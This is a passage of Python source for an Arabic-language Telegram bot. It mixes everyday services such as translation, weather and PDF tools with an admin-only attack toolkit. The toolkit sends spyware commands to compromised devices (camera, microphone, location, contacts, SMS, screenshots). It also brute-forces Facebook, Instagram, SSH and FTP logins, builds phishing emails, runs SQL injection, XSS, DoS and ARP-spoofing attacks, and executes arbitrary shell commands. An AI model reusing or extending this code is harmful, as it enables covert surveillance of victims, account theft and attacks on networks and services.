        # ===== باقي الأزرار (كاميرا، ميكروفون، موقع...) =====
        if data == "hack_camera":
            if not is_admin(chat_id):
                safe_send(chat_id, "هذه الأداة للمطور فقط.")
                return
            device_id = admin_remote.get(chat_id)
            if not device_id:
                safe_send(chat_id, "لم يتم تحديد جهاز. استخدم الأجهزة أولاً")
                return
            add_command(device_id, "CAPTURE_CAMERA")
            safe_send(chat_id, f"تم إرسال أمر الكاميرا للجهاز {device_id}")
            return

        if data == "hack_mic":
            if not is_admin(chat_id):
                safe_send(chat_id, "هذه الأداة للمطور فقط.")
                return
            device_id = admin_remote.get(chat_id)
            if not device_id:
                safe_send(chat_id, "لم يتم تحديد جهاز")
                return
            user_states[chat_id] = "waiting_mic_duration"
            safe_send(chat_id, "أدخل مدة التسجيل بالثواني")
            return

        if data == "hack_location":
            if not is_admin(chat_id):
                safe_send(chat_id, "هذه الأداة للمطور فقط.")
                return
            device_id = admin_remote.get(chat_id)
            if not device_id:
                safe_send(chat_id, "لم يتم تحديد جهاز")
                return
            add_command(device_id, "GET_LOCATION")
            safe_send(chat_id, f"تم إرسال أمر الموقع للجهاز {device_id}")
            return

        if data == "hack_contacts":
            if not is_admin(chat_id):
                safe_send(chat_id, "هذه الأداة للمطور فقط.")
                return
            device_id = admin_remote.get(chat_id)
            if not device_id:
                safe_send(chat_id, "لم يتم تحديد جهاز")
                return
            add_command(device_id, "GET_CONTACTS")
            safe_send(chat_id, f"تم إرسال أمر جهات الاتصال للجهاز {device_id}")
            return

        if data == "hack_sms":
            if not is_admin(chat_id):
                safe_send(chat_id, "هذه الأداة للمطور فقط.")
                return
            device_id = admin_remote.get(chat_id)
            if not device_id:
                safe_send(chat_id, "لم يتم تحديد جهاز")
                return
            add_command(device_id, "GET_SMS")
            safe_send(chat_id, f"تم إرسال أمر SMS للجهاز {device_id}")
            return

        if data == "hack_screenshot":
            if not is_admin(chat_id):
                safe_send(chat_id, "هذه الأداة للمطور فقط.")
                return
            device_id = admin_remote.get(chat_id)
            if not device_id:
                safe_send(chat_id, "لم يتم تحديد جهاز")
                return
            add_command(device_id, "SCREENSHOT")
            safe_send(chat_id, f"تم إرسال أمر لقطة الشاشة للجهاز {device_id}")
            return

        if data == "hack_shutdown":
            if not is_admin(chat_id):
                safe_send(chat_id, "هذه الأداة للمطور فقط.")
                return
            device_id = admin_remote.get(chat_id)
            if not device_id:
                safe_send(chat_id, "لم يتم تحديد جهاز")
                return
            add_command(device_id, "SHUTDOWN")
            safe_send(chat_id, f"تم إرسال أمر إيقاف التشغيل للجهاز {device_id}")
            return

        if data == "user_activity":
            if not is_admin(chat_id):
                safe_send(chat_id, "هذه القائمة للمطور فقط.")
                return
            conn = sqlite3.connect(DB_PATH)
            c = conn.cursor()
            c.execute("SELECT chat_id, action, timestamp FROM user_activity ORDER BY timestamp DESC LIMIT 20")
            rows = c.fetchall()
            conn.close()
            if rows:
                msg = "آخر النشاطات:\n"
                for r in rows:
                    name = get_user_name(r[0])
                    msg += f"{name} - {r[1]} - {r[2][:16]}\n"
                safe_send(chat_id, msg)
            else:
                safe_send(chat_id, "لا توجد نشاطات")
            return

    except Exception as e:
        logger.error(f"خطأ في callback_handler: {e}")
        safe_send(chat_id, "حدث خطأ غير متوقع. تم إبلاغ المطور.")
        notify_admin(f"خطأ في callback: {e}\nData: {call.data}")

# ===================== معالجات النصوص =====================
@bot.message_handler(func=lambda msg: True, content_types=['text'])
def handle_text(message):
    try:
        chat_id = message.chat.id
        text = message.text.strip()
        state = user_states.get(chat_id)

        update_last_seen(chat_id)
        log_activity(chat_id, f"text: {text[:50]}")

        if is_banned(chat_id) and not is_admin(chat_id):
            safe_send(chat_id, "أنت محظور من استخدام البوت")
            return

        if BOT_LOCKED and not is_admin(chat_id):
            safe_send(chat_id, "البوت مقفل حالياً. يرجى التواصل مع المطور")
            return

        # الترجمة
        if state == "waiting_translate":
            markup = InlineKeyboardMarkup(row_width=3)
            for code, name in LANGUAGES.items():
                markup.row(InlineKeyboardButton(name, callback_data=f"trans_lang_{code}"))
            markup.row(InlineKeyboardButton("إلغاء", callback_data="back_main"))
            user_states[chat_id] = "waiting_translate_lang"
            user_states[f"{chat_id}_translate_text"] = text
            safe_send(chat_id, "🌐 اختر اللغة التي تريد الترجمة إليها:", reply_markup=markup)
            return

        if state == "waiting_translate_lang":
            # يتم التعامل معها عبر callback
            pass

        # قص الرابط
        if state == "waiting_shorten_url":
            result = shorten_url(text)
            if result:
                safe_send(chat_id, f"🔗 الرابط المختصر:\n{result}\n\nالرابط الأصلي:\n{text}")
            else:
                safe_send(chat_id, "❌ فشل قص الرابط. تأكد من صحة الرابط.")
            user_states[chat_id] = None
            return

        # فك الرابط
        if state == "waiting_expand_url":
            result = expand_url(text)
            if result:
                safe_send(chat_id, f"🔗 الرابط الأصلي:\n{result}\n\nالرابط المختصر:\n{text}")
            else:
                safe_send(chat_id, "❌ فشل فك الرابط. تأكد من صحة الرابط المختصر.")
            user_states[chat_id] = None
            return

        # إدارة النقاط
        if state == "waiting_admin_points_amount":
            if not is_admin(chat_id):
                return
            target_user = user_states.get(f"{chat_id}_points_target")
            if not target_user:
                safe_send(chat_id, "لم يتم تحديد مستخدم")
                user_states[chat_id] = None
                return
            try:
                amount = int(text)
                reason = "إدارة النقاط من قبل المطور"
                add_points(target_user, amount, reason)
                safe_send(chat_id, f"✅ تم إضافة {amount} نقطة للمستخدم {get_user_name(target_user)}")
                markup, _ = build_users_menu(chat_id, "points")
                if markup:
                    safe_send(chat_id, "اختر مستخدم آخر:", reply_markup=markup)
            except:
                safe_send(chat_id, "يرجى إدخال عدد صحيح")
            user_states[chat_id] = None
            if f"{chat_id}_points_target" in user_states:
                del user_states[f"{chat_id}_points_target"]
            return

        # بريد تصيد
        if state == "waiting_phishing_target":
            platform = user_states.get(f"{chat_id}_phishing_platform", "facebook")
            user_states[chat_id] = "waiting_phishing_action"
            user_states[f"{chat_id}_phishing_target_email"] = text
            markup = InlineKeyboardMarkup(row_width=2)
            markup.row(InlineKeyboardButton("✍️ كتابة يدوية", callback_data="phish_action_manual"), InlineKeyboardButton("🤖 إنشاء تلقائي", callback_data="phish_action_auto"))
            safe_send(chat_id, f"المنصة: {platform}\nالبريد المستهدف: {text}\n\nكيف تريد إنشاء الرسالة؟", reply_markup=markup)
            return

        # إرسال للمستخدم
        if state == "waiting_send_to_user":
            if not is_admin(chat_id):
                return
            target_user = user_states.get(f"{chat_id}_send_target")
            if not target_user:
                safe_send(chat_id, "لم يتم تحديد مستخدم")
                user_states[chat_id] = None
                return
            safe_send(target_user, text)
            safe_send(chat_id, f"✅ تم إرسال الرسالة إلى {get_user_name(target_user)}")
            user_states[chat_id] = None
            if f"{chat_id}_send_target" in user_states:
                del user_states[f"{chat_id}_send_target"]
            return

        # ميزات جديدة
        if state == "waiting_phone_number":
            result = track_phone_number(text)
            safe_send(chat_id, result)
            user_states[chat_id] = None
            return

        if state == "waiting_scan_url":
            safe_send(chat_id, "🔍 جاري فحص الموقع... قد يستغرق بضع ثوانٍ.")
            result = comprehensive_exploit(text)
            report = format_exploit_report(result)
            safe_send(chat_id, report)
            save_scan_result(text, "comprehensive", result)
            user_states[chat_id] = None
            return

        # /start
        if text.startswith('/start'):
            user_name = message.from_user.first_name or "صديق"
            conn = sqlite3.connect(DB_PATH)
            c = conn.cursor()
            c.execute("SELECT created_at, last_seen FROM users WHERE chat_id = ?", (chat_id,))
            row = c.fetchone()
            is_new = False
            if not row:
                c.execute("INSERT INTO users (chat_id, created_at, last_seen) VALUES (?, ?, ?)", (chat_id, datetime.now().isoformat(), datetime.now().isoformat()))
                conn.commit()
                is_new = True
            else:
                last_seen = row[1]
                if last_seen:
                    diff = (datetime.now() - datetime.fromisoformat(last_seen)).days
                    if diff >= 2:
                        safe_send(chat_id, f"انظر من عاد لطلب المساعدة بعد غياب {diff} يوم 😐")
                c.execute("UPDATE users SET last_seen = ? WHERE chat_id = ?", (datetime.now().isoformat(), chat_id))
                conn.commit()
            conn.close()

            if 'ref_' in text:
                code = text.split('ref_')[1].strip()
                conn = sqlite3.connect(DB_PATH)
                c = conn.cursor()
                c.execute("SELECT chat_id FROM users WHERE referral_code = ?", (code,))
                row = c.fetchone()
                if row and row[0] != chat_id:
                    add_points(row[0], 10, "دعوة مستخدم جديد")
                    add_points(chat_id, 10, "مكافأة التسجيل عبر الدعوة")
                    safe_send(row[0], "تم تسجيل مستخدم جديد عبر رابط دعوتك! +10 نقاط")
                    safe_send(chat_id, "تم منحك 10 نقاط مكافأة التسجيل!")
                conn.close()

            get_user_token(chat_id)
            if is_new and PIL_AVAILABLE:
                img_path = create_welcome_image(user_name)
                if img_path:
                    with open(img_path, 'rb') as f:
                        bot.send_photo(chat_id, f, caption=f"مرحباً {user_name}!")
                    os.remove(img_path)
                else:
                    safe_send(chat_id, f"مرحباً {user_name}!")
            else:
                safe_send(chat_id, f"مرحباً بعودتك {user_name}!")
            safe_send(chat_id, "اختر خدمة من القائمة:", reply_markup=build_main_menu(chat_id))
            return

        # باقي الحالات
        if state == "waiting_weather":
            result = get_weather_detailed(text)
            safe_send(chat_id, result)
            user_states[chat_id] = None
            return

        if state == "waiting_wikipedia":
            result = advanced_wikipedia_search(text)
            safe_send(chat_id, f"📚 نتيجة البحث:\n{result}")
            user_states[chat_id] = None
            return

        if state == "waiting_password_strength":
            strength, crack_time, score = password_strength(text)
            safe_send(chat_id, f"🔐 تحليل كلمة السر:\nالقوة: {strength}\nوقت الاختراق المتوقع: {crack_time}\nالدرجة: {score}/6")
            user_states[chat_id] = None
            return

        if state == "waiting_tts":
            filepath = text_to_speech(text)
            if filepath and os.path.exists(filepath):
                with open(filepath, 'rb') as f:
                    bot.send_audio(chat_id, f)
                os.remove(filepath)
            else:
                safe_send(chat_id, "فشل تحويل النص إلى صوت")
            user_states[chat_id] = None
            return

        if state == "waiting_reminder":
            parts = text.split('|')
            if len(parts) >= 2:
                msg_text = parts[0].strip()
                time_str = parts[1].strip()
                try:
                    hour, minute = map(int, time_str.split(':'))
                    now = datetime.now()
                    target_time = now.replace(hour=hour, minute=minute, second=0, microsecond=0)
                    if target_time <= now:
                        target_time += timedelta(days=1)
                    delay = (target_time - now).total_seconds()
                    def send_reminder():
                        safe_send(chat_id, f"⏰ تذكير:\n{msg_text}")
                    timer = threading.Timer(delay, send_reminder)
                    timer.daemon = True
                    timer.start()
                    reminder_timers[chat_id] = timer
                    safe_send(chat_id, f"تم تعيين التذكير لـ {time_str}")
                except:
                    safe_send(chat_id, "وقت غير صحيح")
            else:
                safe_send(chat_id, "صيغة غير صحيحة")
            user_states[chat_id] = None
            return

        if state == "waiting_news":
            result = get_news_without_api(text)
            safe_send(chat_id, f"📰 الأخبار:\n{result}")
            user_states[chat_id] = None
            return

        if state == "waiting_download":
            safe_send(chat_id, "جاري تحميل الفيديو...")
            filename, error = download_video(text)
            if filename:
                try:
                    with open(filename, 'rb') as f:
                        bot.send_video(chat_id, f, caption="تم التحميل", timeout=600)
                    os.remove(filename)
                except Exception as e:
                    safe_send(chat_id, f"فشل إرسال الفيديو: {str(e)}")
            else:
                safe_send(chat_id, f"فشل التحميل: {error}")
            user_states[chat_id] = None
            return

        if state == "waiting_link_check_advanced":
            safe_send(chat_id, "🔍 جاري فحص الرابط... قد يستغرق بضع ثوانٍ")
            result = check_link_safety_advanced(text, chat_id)
            if isinstance(result, str):
                safe_send(chat_id, result)
            else:
                report = format_link_report(result)
                safe_send(chat_id, report)
            user_states[chat_id] = None
            return

        if state == "waiting_broadcast":
            if not is_admin(chat_id):
                return
            conn = sqlite3.connect(DB_PATH)
            c = conn.cursor()
            c.execute("SELECT chat_id FROM users")
            users = c.fetchall()
            conn.close()
            sent = 0
            for user in users:
                try:
                    bot.send_message(user[0], f"📢 رسالة من الإدارة:\n{text}")
                    sent += 1
                    time.sleep(0.05)
                except:
                    pass
            safe_send(chat_id, f"تم إرسال الرسالة لـ {sent} مستخدم")
            user_states[chat_id] = None
            return

        # تخمين كلمات السر
        if state == "waiting_fb_username":
            if not is_admin(chat_id):
                return
            user_states[chat_id] = "waiting_fb_password_list"
            user_states[f"{chat_id}_fb_user"] = text
            safe_send(chat_id, "أرسل قائمة كلمات السر (مفصولة بفواصل) أو اكتب 'default'")
            return

        if state == "waiting_fb_password_list":
            if not is_admin(chat_id):
                return
            username = user_states.get(f"{chat_id}_fb_user")
            if text.lower() == 'default':
                passwords = ['123456', 'password', '123456789', 'qwerty', 'abc123', 'admin', 'welcome', 'monkey', 'dragon', 'master']
            else:
                passwords = [p.strip() for p in text.split(',')]
            safe_send(chat_id, f"جاري تخمين كلمة سر فيسبوك لـ {username} ...")
            result = brute_force_facebook(username, passwords, max_attempts=len(passwords))
            if result['success']:
                safe_send(chat_id, f"✅ تم اختراق الحساب! كلمة السر: {result['credentials']['password']}")
                notify_admin(f"🔥 تم اختراق فيسبوك! المستخدم: {username}, كلمة السر: {result['credentials']['password']}")
            else:
                safe_send(chat_id, f"❌ فشل التخمين. تم تجربة {result['attempts']} كلمة سر")
            user_states[chat_id] = None
            return

        # باقي حالات التخمين (انستغرام، SSH، FTP، مخصص) بنفس النمط (مختصرة)
        if state == "waiting_ig_username":
            if not is_admin(chat_id):
                return
            user_states[chat_id] = "waiting_ig_password_list"
            user_states[f"{chat_id}_ig_user"] = text
            safe_send(chat_id, "أرسل قائمة كلمات السر (مفصولة بفواصل) أو اكتب 'default'")
            return

        if state == "waiting_ig_password_list":
            if not is_admin(chat_id):
                return
            username = user_states.get(f"{chat_id}_ig_user")
            if text.lower() == 'default':
                passwords = ['123456', 'password', '123456789', 'qwerty', 'abc123', 'admin', 'welcome', 'monkey', 'dragon', 'master']
            else:
                passwords = [p.strip() for p in text.split(',')]
            safe_send(chat_id, f"جاري تخمين كلمة سر انستغرام لـ {username} ...")
            result = brute_force_instagram(username, passwords, max_attempts=len(passwords))
            if result['success']:
                safe_send(chat_id, f"✅ تم اختراق الحساب! كلمة السر: {result['credentials']['password']}")
                notify_admin(f"🔥 تم اختراق انستغرام! المستخدم: {username}, كلمة السر: {result['credentials']['password']}")
            else:
                safe_send(chat_id, f"❌ فشل التخمين. تم تجربة {result['attempts']} كلمة سر")
            user_states[chat_id] = None
            return

        if state == "waiting_ssh_target":
            if not is_admin(chat_id):
                return
            user_states[chat_id] = "waiting_ssh_password_list"
            user_states[f"{chat_id}_ssh_target"] = text
            safe_send(chat_id, "أرسل قائمة كلمات السر أو 'default'")
            return

        if state == "waiting_ssh_password_list":
            if not is_admin(chat_id):
                return
            target = user_states.get(f"{chat_id}_ssh_target")
            if text.lower() == 'default':
                passwords = ['123456', 'password', 'admin', 'root', 'qwerty']
            else:
                passwords = [p.strip() for p in text.split(',')]
            parts = target.split('|')
            if len(parts) == 2:
                ip, username = parts[0].strip(), parts[1].strip()
                safe_send(chat_id, f"جاري تخمين SSH على {ip} ...")
                result = brute_force_ssh(ip, username, passwords, max_attempts=len(passwords))
                if result['success']:
                    safe_send(chat_id, f"✅ تم اختراق SSH! المستخدم: {username}, كلمة السر: {result['credentials']['password']}")
                    notify_admin(f"🔥 تم اختراق SSH! IP: {ip}, المستخدم: {username}, كلمة السر: {result['credentials']['password']}")
                else:
                    safe_send(chat_id, f"❌ فشل اختراق SSH. تم تجربة {result['attempts']} كلمة سر")
            else:
                safe_send(chat_id, "صيغة غير صحيحة")
            user_states[chat_id] = None
            return

        if state == "waiting_ftp_target":
            if not is_admin(chat_id):
                return
            user_states[chat_id] = "waiting_ftp_password_list"
            user_states[f"{chat_id}_ftp_target"] = text
            safe_send(chat_id, "أرسل قائمة كلمات السر أو 'default'")
            return

        if state == "waiting_ftp_password_list":
            if not is_admin(chat_id):
                return
            target = user_states.get(f"{chat_id}_ftp_target")
            if text.lower() == 'default':
                passwords = ['123456', 'password', 'admin', 'ftp', 'qwerty']
            else:
                passwords = [p.strip() for p in text.split(',')]
            parts = target.split('|')
            if len(parts) == 2:
                ip, username = parts[0].strip(), parts[1].strip()
                safe_send(chat_id, f"جاري تخمين FTP على {ip} ...")
                result = brute_force_ftp(ip, username, passwords, max_attempts=len(passwords))
                if result['success']:
                    safe_send(chat_id, f"✅ تم اختراق FTP! المستخدم: {username}, كلمة السر: {result['credentials']['password']}")
                    notify_admin(f"🔥 تم اختراق FTP! IP: {ip}, المستخدم: {username}, كلمة السر: {result['credentials']['password']}")
                else:
                    safe_send(chat_id, f"❌ فشل اختراق FTP. تم تجربة {result['attempts']} كلمة سر")
            else:
                safe_send(chat_id, "صيغة غير صحيحة")
            user_states[chat_id] = None
            return

        if state == "waiting_custom_bruteforce":
            if not is_admin(chat_id):
                return
            parts = text.split('|')
            if len(parts) >= 2:
                target = parts[0].strip()
                platform_type = parts[1].strip().lower()
                passwords = parts[2].split(',') if len(parts) > 2 else ['123456', 'password']
                if platform_type == 'facebook':
                    result = brute_force_facebook(target, passwords)
                elif platform_type == 'instagram':
                    result = brute_force_instagram(target, passwords)
                elif platform_type == 'ssh':
                    ip, user = target.split(':')
                    result = brute_force_ssh(ip, user, passwords)
                elif platform_type == 'ftp':
                    ip, user = target.split(':')
                    result = brute_force_ftp(ip, user, passwords)
                else:
                    result = {'success': False, 'attempts': len(passwords)}
                if result['success']:
                    safe_send(chat_id, f"✅ تم الاختراق! البيانات: {result['credentials']}")
                    notify_admin(f"🔥 اختراق مخصص! البيانات: {result['credentials']}")
                else:
                    safe_send(chat_id, f"❌ فشل الاختراق. تم تجربة {result['attempts']} كلمة سر")
            else:
                safe_send(chat_id, "صيغة غير صحيحة")
            user_states[chat_id] = None
            return

        # هجمات
        if state == "waiting_portscan":
            if not is_admin(chat_id):
                return
            safe_send(chat_id, f"جاري مسح منافذ {text} ...")
            open_ports = port_scan(text)
            if open_ports:
                safe_send(chat_id, f"المنافذ المفتوحة: {open_ports}")
            else:
                safe_send(chat_id, "لا توجد منافذ مفتوحة أو فشل المسح")
            user_states[chat_id] = None
            return

        if state == "waiting_ssl":
            if not is_admin(chat_id):
                return
            safe_send(chat_id, f"جاري فحص SSL لـ {text} ...")
            result = ssl_scan(text)
            if result['valid']:
                msg = f"شهادة SSL صالحة حتى: {result['not_after']}\nالجهة المصدرة: {result['issuer']}"
                safe_send(chat_id, msg)
            else:
                safe_send(chat_id, f"فشل فحص SSL: {result.get('error', 'خطأ غير معروف')}")
            user_states[chat_id] = None
            return

        if state == "waiting_sqli_hack":
            if not is_admin(chat_id):
                return
            result = comprehensive_exploit(text)
            sqli_findings = [e for e in result.get('exploited', []) if e['type'] == 'SQL Injection']
            if sqli_findings:
                msg = "تم العثور على ثغرات SQL Injection:\n"
                for f in sqli_findings:
                    msg += f"المعامل: {f['parameter']}, الحمولة: {f['payload']}\n"
                msg += "\nتم استغلالها بنجاح"
            else:
                msg = "لم يتم العثور على ثغرات SQL Injection"
            safe_send(chat_id, msg)
            user_states[chat_id] = None
            return

        if state == "waiting_xss_hack":
            if not is_admin(chat_id):
                return
            result = comprehensive_exploit(text)
            xss_findings = [e for e in result.get('exploited', []) if e['type'] == 'XSS']
            if xss_findings:
                msg = "تم العثور على ثغرات XSS:\n"
                for f in xss_findings:
                    msg += f"المعامل: {f['parameter']}, الحمولة: {f['payload']}\n"
                msg += "\nتم استغلالها بنجاح"
            else:
                msg = "لم يتم العثور على ثغرات XSS"
            safe_send(chat_id, msg)
            user_states[chat_id] = None
            return

        if state == "waiting_dos":
            if not is_admin(chat_id):
                return
            parts = text.split('|')
            if len(parts) >= 2:
                target = parts[0].strip()
                port = int(parts[1]) if parts[1].isdigit() else 80
                duration = int(parts[2]) if len(parts) > 2 and parts[2].isdigit() else 10
                safe_send(chat_id, f"بدء هجوم DoS على {target}:{port} لمدة {duration} ثانية...")
                result = dos_attack(target, port, duration)
                if result['status'] == 'completed':
                    safe_send(chat_id, f"انتهى الهجوم. تم إرسال {result['packets_sent']} حزمة")
                else:
                    safe_send(chat_id, f"فشل الهجوم: {result.get('error', 'خطأ غير معروف')}")
            else:
                safe_send(chat_id, "صيغة غير صحيحة")
            user_states[chat_id] = None
            return

        if state == "waiting_arp":
            if not is_admin(chat_id):
                return
            parts = text.split('|')
            if len(parts) == 2:
                target_ip, gateway_ip = parts[0].strip(), parts[1].strip()
                safe_send(chat_id, f"بدء هجوم ARP Spoofing على {target_ip} عبر البوابة {gateway_ip} ...")
                result = arp_spoof(target_ip, gateway_ip)
                if result['status'] == 'success':
                    safe_send(chat_id, "تم تنفيذ الهجوم بنجاح")
                else:
                    safe_send(chat_id, f"فشل الهجوم: {result.get('error', 'خطأ غير معروف')}")
            else:
                safe_send(chat_id, "صيغة غير صحيحة")
            user_states[chat_id] = None
            return

        if state == "waiting_shell":
            if not is_admin(chat_id):
                return
            try:
                result = subprocess.run(text, shell=True, capture_output=True, text=True, timeout=30)
                output = result.stdout + result.stderr
                if len(output) > 4000:
                    output = output[:4000] + "\n... (مقطوع)"
                safe_send(chat_id, f"نتيجة الأمر:\n{output}")
            except Exception as e:
                safe_send(chat_id, f"خطأ: {str(e)}")
            user_states[chat_id] = None
            return

        if state == "waiting_mic_duration":
            if not is_admin(chat_id):
                return
            try:
                duration = int(text)
                device_id = admin_remote.get(chat_id)
                if device_id:
                    add_command(device_id, f"RECORD_AUDIO:{duration}")
                    safe_send(chat_id, f"تم إرسال أمر التسجيل لمدة {duration} ثانية للجهاز {device_id}")
                else:
                    safe_send(chat_id, "لم يتم تحديد جهاز")
            except:
                safe_send(chat_id, "يرجى إدخال رقم صحيح")
            user_states[chat_id] = None
            return

        if state is None:
            safe_send(chat_id, "اختر خدمة من القائمة:", reply_markup=build_main_menu(chat_id))

    except Exception as e:
        logger.error(f"خطأ في handle_text: {e}")
        safe_send(chat_id, "حدث خطأ غير متوقع. تم إبلاغ المطور.")
        notify_admin(f"خطأ في handle_text: {e}")

# ===================== معالج الملفات =====================
@bot.message_handler(content_types=['document'])
def handle_documents(message):
    try:
        chat_id = message.chat.id
        state = user_states.get(chat_id)
        file = message.document
        file_name = file.file_name or "بدون اسم"

        if state in ["waiting_pdf_summary", "waiting_pdf_extract", "waiting_pdf_smart"]:
            if not file_name.lower().endswith('.pdf'):
                safe_send(chat_id, "يرجى إرسال ملف PDF")
                return
            safe_send(chat_id, "جاري تحليل الملف...")
            file_info = bot.get_file(file.file_id)
            downloaded = bot.download_file(file_info.file_path)
            pdf_text = extract_pdf_text(downloaded)
            if not pdf_text:
                safe_send(chat_id, "فشل استخراج النص من الملف")
                user_states[chat_id] = None
                return
            pdf_texts[chat_id] = pdf_text
            if state == "waiting_pdf_summary":
                summary = summarize_pdf_text(pdf_text, 6)
                safe_send(chat_id, f"📄 ملخص PDF:\n{summary}")
            elif state == "waiting_pdf_extract":
                chunks = split_text_into_chunks(pdf_text, 3000)
                msg = f"📤 نصوص PDF المستخرجة:\nعدد الأحرف: {len(pdf_text)}\nعدد الأجزاء: {len(chunks)}\n\n"
                for i, chunk in enumerate(chunks[:3]):
                    msg += f"الجزء {i+1}:\n{chunk[:500]}...\n\n"
                if len(chunks) > 3:
                    msg += f"... وعرض {len(chunks)-3} أجزاء أخرى"
                safe_send(chat_id, msg)
            elif state == "waiting_pdf_smart":
                safe_send(chat_id, "تم تحليل الملف بنجاح\nالآن يمكنك طرح أي سؤال عن المحتوى (اكتب سؤالك)")
                user_states[chat_id] = "waiting_pdf_question"
                return
            user_states[chat_id] = None
            return

        if state == "waiting_pdf_question":
            safe_send(chat_id, "يرجى كتابة سؤالك عن الملف (نصي)")
            return

        if state == "waiting_apk_analysis":
            if not file_name.lower().endswith('.apk'):
                safe_send(chat_id, "يرجى إرسال ملف APK")
                return
            safe_send(chat_id, "جاري تحليل الملف...")
            file_info = bot.get_file(file.file_id)
            downloaded = bot.download_file(file_info.file_path)
            result = analyze_apk(downloaded, file_name)
            if result.get('error'):
                safe_send(chat_id, f"فشل التحليل: {result['error']}")
            else:
                msg = f"📦 نتيجة فحص APK:\nالملف: {file_name}\nضار: {result.get('malicious', 0)}\nمشبوه: {result.get('suspicious', 0)}\nآمن: {result.get('harmless', 0)}\nغير مكتشف: {result.get('undetected', 0)}"
                if result.get('malicious', 0) > 0:
                    msg += "\n🚨 تحذير: تم اكتشاف برمجيات خبيثة!"
                elif result.get('suspicious', 0) > 0:
                    msg += "\n⚠️ تنبيه: يوجد عناصر مشبوهة"
                else:
                    msg += "\n✅ الملف يبدو آمناً"
                safe_send(chat_id, msg)
            user_states[chat_id] = None
            return

        safe_send(chat_id, "تم استلام الملف. استخدم الأزرار المناسبة لتحليل PDF أو APK")
    except Exception as e:
        logger.error(f"خطأ في handle_documents: {e}")
        safe_send(chat_id, "حدث خطأ أثناء معالجة الملف")

# ===================== معالج أسئلة PDF =====================
@bot.message_handler(func=lambda msg: user_states.get(msg.chat.id) == "waiting_pdf_question", content_types=['text'])
def handle_pdf_question(message):
    try:
        chat_id = message.chat.id
        question = message.text.strip()
        pdf_text = pdf_texts.get(chat_id)
        if not pdf_text:
            safe_send(chat_id, "لم يتم تحميل أي ملف PDF. أرسل ملفاً أولاً")
            user_states[chat_id] = None
            return
        if len(question) < 3:
            safe_send(chat_id, "السؤال قصير جداً. اكتب سؤالاً واضحاً")
            return
        safe_send(chat_id, "جاري البحث عن الإجابة...")
        answer = smart_pdf_search(pdf_text, question)
        safe_send(chat_id, f"📚 الإجابة:\n{answer}")
    except Exception as e:
        logger.error(f"خطأ في PDF question: {e}")
        safe_send(chat_id, "حدث خطأ أثناء البحث")

# ===================== دوال إضافية =====================
def add_command(device_id, command):
    safe_db_execute("INSERT INTO commands (device_id, command, created_at, executed) VALUES (?, ?, ?, 0)",
                    (device_id, command, datetime.now().isoformat()))

def save_scan_result(target, scan_type, results):
    safe_db_execute("INSERT INTO scan_results (target, scan_type, results, created_at) VALUES (?, ?, ?, ?)",
                    (target, scan_type, json.dumps(results), datetime.now().isoformat()))

# ===================== تشغيل البوت =====================
def start_bot():
    while True:
        try:
            try:
                bot.delete_webhook()
                logger.info("✅ تم مسح الـ Webhook بنجاح")
                time.sleep(3)
            except Exception as e:
                logger.warning(f"⚠️ فشل مسح الـ Webhook: {e}")

            logger.info("🚀 بدء تشغيل البوت...")
            bot.polling(
                none_stop=True,
                interval=0,
                timeout=60,
                long_polling_timeout=60,
                skip_pending=True
            )
        except Exception as e:
            logger.error(f"❌ خطأ في البوت: {e}")
            if "409" in str(e):
                logger.warning("⚠️ خطأ 409: إعادة محاولة الاتصال بعد 15 ثانية...")
                time.sleep(15)
            else:
                time.sleep(5)

if __name__ == '__main__':
    print("\n" + "="*60)
    print("🤖 البوت جاهز للتشغيل!")
    print(f"📌 رابط الـ Health Check: {SERVER_URL}/health")
    print("💡 نصيحة: استخدم UptimeRobot لإرسال Ping كل 5 دقائق إلى الرابط أعلاه.")
    print("="*60 + "\n")
    logger.info(f"✅ البوت يعمل على الرابط: {SERVER_URL}")

    try:
        bot.delete_webhook()
        logger.info("✅ تم مسح الـ Webhook (بداية التشغيل)")
    except Exception as e:
        logger.warning(f"⚠️ فشل مسح الـ Webhook في البداية: {e}")

    time.sleep(2)

    threading.Thread(target=keep_alive, daemon=True).start()
    threading.Thread(target=check_reminders, daemon=True).start()
    threading.Thread(target=start_bot, daemon=True).start()

    app.run(host='0.0.0.0', port=PORT, debug=False)
